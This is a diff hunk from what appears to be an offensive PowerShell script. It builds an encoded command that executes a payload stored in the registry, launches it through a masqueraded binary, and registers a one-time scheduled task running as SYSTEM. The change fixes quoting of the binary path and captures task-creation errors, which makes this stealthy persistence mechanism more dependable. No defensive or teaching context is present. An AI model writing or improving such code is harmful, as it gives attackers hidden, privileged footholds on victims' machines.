@@ -107,11 +107,11 @@ if ($checkVal) {
 $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
     "iex(gp '$regPath').$regName"
 ))
-$taskCmd = "$masqueradeDst -NoP -Enc $b64"
+$taskCmd = "`"$masqueradeDst`" -NoP -Enc $b64"
 $taskTime = (Get-Date).AddMinutes(1).ToString('HH:mm')
 
-schtasks /create /tn $taskName /ru SYSTEM /tr "$taskCmd" /sc ONCE /st $taskTime /Z | Out-Null
-Write-Log "[*] Task $taskName created at $taskTime"
+$createErr = (& schtasks /create /tn $taskName /ru SYSTEM /tr "$taskCmd" /sc ONCE /st $taskTime /Z 2>&1)
+Write-Log "[*] Task $taskName create output: $createErr"
 $taskCheck = schtasks /query /tn $taskName 2>&1
 if ($LASTEXITCODE -eq 0) {
     Write-Log "[+] Task $taskName created (verified)"
